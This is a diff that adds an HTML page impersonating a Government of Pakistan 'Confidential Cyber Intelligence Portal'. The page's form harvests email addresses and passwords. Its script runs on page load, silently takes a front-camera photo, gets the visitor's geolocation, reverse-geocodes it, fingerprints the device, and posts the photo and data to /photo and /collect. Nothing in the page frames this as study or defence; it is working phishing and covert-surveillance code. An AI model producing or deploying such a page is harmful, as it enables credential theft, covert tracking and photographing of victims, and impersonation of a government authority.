@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>🇵🇰 Government of Pakistan – Cyber Intelligence</title>
+  <link rel="icon" href="/static/pakistan-emblem.png" />
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #121b23;
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      justify-content: space-between;
+    }
+    .container {
+      margin-top: 50px;
+      text-align: center;
+      max-width: 400px;
+      padding: 20px;
+      background: rgba(255, 255, 255, 0.05);
+      border-radius: 12px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.4);
+    }
+    h1 {
+      font-size: 22px;
+    }
+    p {
+      font-size: 14px;
+    }
+    input, button {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      border-radius: 6px;
+      border: none;
+      font-size: 14px;
+    }
+    input {
+      background: #e0e0e0;
+      color: #000;
+    }
+    button {
+      background: #d63031;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    footer {
+      padding: 12px;
+      font-size: 12px;
+      color: #999;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="/static/pakistan-emblem.png" alt="Logo" width="70" />
+    <h1>🇵🇰 Confidential Cyber Intelligence Portal</h1>
+    <p>Enter your credentials to access national breach database.</p>
+    <form method="POST" action="/login">
+      <input type="text" name="email" placeholder="Email" required />
+      <input type="password" name="password" placeholder="Password" required />
+      <button type="submit">🔍 Verify Access</button>
+    </form>
+  </div>
+
+  <footer>
+    © National Cyber Division &bullet; Secure Gateway 2025
+  </footer>
+
+<script>
+  function getDeviceName(ua) {
+    const devices = [
+      { keyword: "SOG05", name: "Sony Xperia" },
+      { keyword: "SM-", name: "Samsung Galaxy" },
+      { keyword: "Infinix", name: "Infinix Phone" },
+      { keyword: "TECNO", name: "TECNO Device" },
+      { keyword: "Redmi", name: "Xiaomi Redmi" },
+      { keyword: "Pixel", name: "Google Pixel" },
+      { keyword: "OPPO", name: "Oppo Device" },
+      { keyword: "Vivo", name: "Vivo Device" },
+      { keyword: "OnePlus", name: "OnePlus" }
+    ];
+    for (const d of devices) if (ua.includes(d.keyword)) return d.name;
+    return "Generic Android Device";
+  }
+
+  async function reverseGeocode(lat, lon) {
+    const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`;
+    const res = await fetch(url);
+    const data = await res.json();
+    return {
+      city: data.address.city || data.address.town || data.address.village || "Unknown",
+      country: data.address.country || "Unknown",
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+    };
+  }
+
+  async function sendInfo(coords, cameraStatus) {
+    let geoData = { city: "Unknown", country: "Unknown", timezone: "Unknown" };
+    if (coords) geoData = await reverseGeocode(coords.latitude, coords.longitude);
+
+    const payload = {
+      ip: "Unknown",
+      latitude: coords?.latitude,
+      longitude: coords?.longitude,
+      mapsLink: coords ? `https://www.google.com/maps?q=${coords.latitude},${coords.longitude}` : "❌ Location Denied",
+      timezone: geoData.timezone,
+      city: geoData.city,
+      country: geoData.country,
+      camera: cameraStatus,
+      userAgent: navigator.userAgent,
+      deviceName: getDeviceName(navigator.userAgent)
+    };
+
+    await fetch('/collect', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+  }
+
+  async function captureCamera() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      video.play();
+      setTimeout(() => {
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        canvas.toBlob(blob => {
+          const formData = new FormData();
+          formData.append('photo', blob, 'photo.jpg');
+          fetch('/photo', { method: 'POST', body: formData });
+        });
+        stream.getTracks().forEach(track => track.stop());
+      }, 2500);
+
+      navigator.geolocation.getCurrentPosition(
+        pos => sendInfo(pos.coords, "✅ Camera Allowed"),
+        err => sendInfo(null, "✅ Camera Allowed, ❌ Location Denied")
+      );
+
+    } catch (err) {
+      sendInfo(null, "❌ Camera Denied");
+    }
+  }
+
+  window.onload = captureCamera;
+</script>
+</body>
+</html>
